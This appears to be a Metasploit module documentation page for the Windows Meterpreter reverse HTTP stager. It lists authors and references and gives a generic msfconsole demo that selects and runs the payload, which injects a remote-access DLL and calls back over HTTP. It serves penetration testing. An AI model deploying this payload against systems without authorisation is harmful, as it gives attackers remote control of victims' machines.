## Windows Meterpreter (Reflective Injection), Windows Reverse HTTP Stager (wininet)

Inject the meterpreter server DLL via the Reflective Dll 
Injection payload (staged). Tunnel communication over HTTP 
(Windows wininet)


## Module Name
payload/windows/meterpreter/reverse_http

## Authors
* skape
* sf
* OJ Reeves
* hdm


## References
* https://github.com/stephenfewer/ReflectiveDLLInjection
* https://github.com/rapid7/ReflectiveDLLInjection




## Platforms
* win

## Reliability
[Normal](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)

## Demo

```
msf > use payload/windows/meterpreter/reverse_http
msf payload(reverse_http) > show targets
   ... a list of targets ...
msf payload(reverse_http) > set TARGET <target-id>
msf payload(reverse_http) > show options
   ... show and set options ...
msf payload(reverse_http) > run
```
    
    